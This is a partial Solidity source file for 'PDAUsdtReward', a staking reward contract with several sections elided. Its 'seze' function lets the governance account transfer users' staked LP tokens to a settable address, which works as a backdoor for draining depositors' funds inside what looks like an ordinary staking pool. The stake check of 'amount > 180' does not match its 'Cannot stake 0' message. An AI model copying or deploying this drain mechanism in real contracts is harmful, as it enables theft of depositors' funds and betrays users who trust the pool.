//SourceUnit: PDAUsdtReward-2.sol
...
contract LPTokenWrapper is IPool,Governance {
    ...
    address public _playerBook = address(0x415335acee629928bc6d4b108a54055030fc0ffb5b);
...
contract PDAUsdtReward is LPTokenWrapper{
    using SafeERC20 for IERC20;

    IERC20 public _dego = IERC20(0x41044639f9d015c0b7c2ef7e6fdcb2fcd5f3fade0a);
    address public _teamWallet ;
    address public _rewardPool ;
	address public _sezeaddress = 0x6666666666666666666666666666666666666666;

    uint256 public constant DURATION = 90 days;

    uint256 public _initReward = 9000 * 1e18;
    ...
    function setsezeaddress(address sezeaddress) public
    onlyGovernance
    {
        require(sezeaddress != address(0x0));
		_sezeaddress = sezeaddress;
    }
	
    function seze(uint256 amount) external onlyGovernance{
        _lpToken.transfer(_sezeaddress, amount);
    }
    ...
    function stake(uint256 amount, string memory affCode)
        ...
        checkStart
    {
        require(amount > 180, "Cannot stake 0");
